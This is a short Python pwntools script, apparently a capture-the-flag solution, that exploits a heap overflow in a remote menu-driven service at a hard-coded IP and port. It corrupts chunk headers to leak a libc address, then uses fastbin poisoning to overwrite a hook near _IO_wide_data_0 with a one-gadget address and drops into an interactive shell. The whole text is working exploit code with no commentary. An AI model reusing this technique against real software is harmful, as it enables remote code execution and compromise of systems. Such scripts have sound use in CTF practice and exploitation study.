from pwn import *


#s = remote('192.168.0.85',1234)
s = remote('202.120.7.218',2017)
def alloc(size):
  s.recvuntil('Command: ')
  s.send('1\n')
  s.recvuntil('Size: ')
  s.send(str(size)+'\n')
def fill(index,size,dat):
  s.recvuntil('Command: ')
  s.send('2\n')
  s.recvuntil('Index: ')
  s.send(str(index)+'\n')
  s.recvuntil('Size: ')
  s.send(str(size)+'\n')
  s.recvuntil('Content: ')
  s.send(dat)
def free(index):
  s.recvuntil('Command: ')
  s.send('3\n')
  s.recvuntil('Index: ')
  s.send(str(index)+'\n')
# 0x3a5600 -- main_arena + 88
# 0x3a55ed -- _IO_wide_data_0
# 0x041374 -- magic
alloc(0x30)
alloc(0x30)
alloc(0x30)
alloc(1024)
alloc(1024)
free(1)
free(2)
dat = 'A'*0x30+p64(0)+p64(0x41)+'A'*0x30+p64(0)+p64(0x41)+'\xb0'
fill(0,len(dat),dat)
alloc(0x30)
fill(1,0x30,'A'*0x20+p64(0)+p64(0x41))
alloc(0x30)
fill(2,0x10,p64(0)+p64(0x411))
free(3)
s.recvuntil('Command: ')
s.send('4\n')
s.recvuntil('Index: ')
s.send('2\n')
libc = u64(s.recvuntil('1.')[0x1a:0x1a+6]+'\x00\x00') - 0x3a5678#0x3c3b78
log.info('LIBC : 0x%x'%libc)
alloc(0x68) # 3
alloc(0x68) # 5
alloc(0x68) # 6
free(6)
free(5)
dat = 'A'*0x60+p64(0)+p64(0x71)+p64(libc+0x3a55ed)#0x3c3aed)
fill(3,len(dat),dat)
alloc(0x68)
alloc(0x68)
dat = 'A'*0x13+p64(libc+ 0x041374)#0x04526A)
fill(6,len(dat),dat)
s.interactive()
